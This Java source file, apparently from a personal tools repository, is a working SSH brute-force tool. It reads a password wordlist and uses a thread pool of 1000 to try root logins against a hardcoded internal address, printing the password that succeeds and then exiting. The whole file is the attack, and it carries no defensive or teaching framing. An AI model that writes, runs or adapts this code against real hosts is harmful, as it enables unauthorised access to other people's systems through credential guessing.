/*
 * Copyright 2021 tomoncle
 *
 * Licensed under the Apache License, Version 2.0 (the "License");
 * you may not use this file except in compliance with the License.
 * You may obtain a copy of the License at
 *
 *    http://www.apache.org/licenses/LICENSE-2.0
 *
 * Unless required by applicable law or agreed to in writing, software
 * distributed under the License is distributed on an "AS IS" BASIS,
 * WITHOUT WARRANTIES OR CONDITIONS OF ANY KIND, either express or implied.
 * See the License for the specific language governing permissions and
 * limitations under the License.
 */

package com.tomoncle.tools.ssh;

import com.jcabi.ssh.Shell;
import com.jcabi.ssh.SshByPassword;
import lombok.SneakyThrows;

import java.io.BufferedReader;
import java.io.IOException;
import java.io.InputStreamReader;
import java.util.ArrayList;
import java.util.List;
import java.util.concurrent.ExecutorService;
import java.util.concurrent.Executors;


/**
 * 暴力破解密码库 https://github.com/OpenSourceDocs/bruteforce-database
 *
 * @author tomoncle
 */

public class SSHBruteForce {
    private static List<String> passwords = new ArrayList<>();

    @SneakyThrows
    private static void initPassword() {
        SSHBruteForce sshBruteForce = new SSHBruteForce();
        String inputFileName = "/ssh/uniqpass-v16.password";
        try (BufferedReader bufferedReader = new BufferedReader(new InputStreamReader(
                sshBruteForce.getClass().getResourceAsStream(inputFileName)))) {
            String line;
            while (true) {
                line = bufferedReader.readLine();
                if (line == null || line.length() == 0) {
                    break;
                }
                line = line.replaceAll("\\s", "");
                if (line.length() == 0) {
                    break;
                }
                passwords.add(line);
            }
        }
    }

    private static void sshLogin(final String password) {
        try {
            Shell shell = new SshByPassword("172.16.110.6", 22, "root", password);
            new Shell.Plain(shell).exec("echo 'Hello, world!'");
            System.out.println(Thread.currentThread().getName()+" ==> 密码正确：" + password);
            System.out.println("系统退出.");
            System.exit(0);
        } catch (IOException ignored) {
        }
    }


    @SneakyThrows
    public static void main(String[] args) {
        initPassword();
        ExecutorService executor = Executors.newFixedThreadPool(1000);
        for (int i = 0; i < passwords.size(); i++) {
            final int index = i;
            executor.submit(() -> sshLogin(passwords.get(index)));
        }
        executor.shutdown();
    }
}
